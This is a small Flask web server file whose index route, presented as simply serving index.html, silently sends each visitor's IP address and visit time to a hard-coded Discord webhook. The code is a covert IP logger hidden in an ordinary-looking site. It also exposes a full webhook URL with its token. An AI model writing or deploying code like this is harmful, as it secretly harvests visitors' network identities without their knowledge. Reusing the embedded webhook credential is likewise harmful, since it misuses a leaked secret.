from flask import Flask, jsonify, request
from datetime import datetime
import requests

# Initialize the Flask application
# static_folder='.' tells Flask to serve static files from the current directory
# static_url_path='' means the files will be served at the root URL (e.g., /style.css)
app = Flask(__name__, static_folder='.', static_url_path='')

def send_ip(ip, date):
    webhook_url = "https://discord.com/api/webhooks/1476256421438951526/1XbFzQdfe3YZTQN_MyA8Uc41JSBOVsgG7p747qa7i9AY66EzPbaUfxBXv0pdfwY9fLp3"
    data = {
        "content": "",
        "title": "IP"
    }
    data["embeds"] = [
        {
            "title": ip,
            "description": date
        }
    ]
    requests.post(webhook_url, json=data)

@app.route('/')
def index():
    """Serve the main index.html file."""
    ip = request.environ.get("HTTP_X_FORWARDED_FOR", request.remote_addr)
    date = datetime.today().strftime("%Y-%m-%d %H:%M:%S")
    send_ip(ip, date)
    return app.send_static_file('index.html')


@app.route('/api/hello')
def hello():
    """Example API endpoint."""
    return jsonify(message="Hello from the Flask backend server!")


if __name__ == '__main__':
    # Run the server on port 3000
    app.run(port=3000, debug=True)

